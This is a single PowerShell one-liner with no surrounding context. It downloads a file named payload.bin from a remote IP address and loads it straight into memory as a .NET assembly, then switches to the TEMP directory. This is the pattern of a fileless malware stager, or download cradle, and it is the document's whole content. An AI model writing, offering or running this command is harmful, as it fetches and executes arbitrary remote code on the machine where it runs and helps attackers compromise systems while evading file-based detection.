$StageBytes = (New-Object System.Net.WebClient).DownloadData("http://198.51.100.48/payload.bin"); [Reflection.Assembly]::Load($StageBytes); Set-Location -Path $env:TEMP
